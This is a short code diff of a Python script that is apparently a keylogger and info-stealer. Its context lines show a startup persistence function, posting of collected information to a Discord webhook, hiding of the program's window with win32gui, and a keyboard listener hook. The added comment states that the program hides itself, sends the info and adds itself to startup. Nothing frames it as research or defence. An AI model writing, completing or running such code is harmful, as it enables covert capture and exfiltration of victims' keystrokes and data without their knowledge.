@@ -35,8 +35,7 @@ def add_to_startup():
 def send_discord_message(webhook_url, message):
     data = {"content": message}
     headers = {"Content-Type": "application/json"}
-    requests.post(webhook_url, json=data, headers=headers)
-    
+    requests.post(webhook_url, json=data, headers=headers)    
 payload = {
     "content": "@everyone",
 }
@@ -84,6 +83,7 @@ headers = {
     "Content-Type": "application/json"
 }
 
+#hides the program, sends all the info from api and adds code to startup
 response = requests.post(webhook_url, data=json.dumps(information), headers=headers)
 hide = win32gui.GetForegroundWindow()
 win32gui.ShowWindow(hide, win32con.SW_HIDE)
@@ -107,5 +107,6 @@ def on_press(key):
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
+
 
 
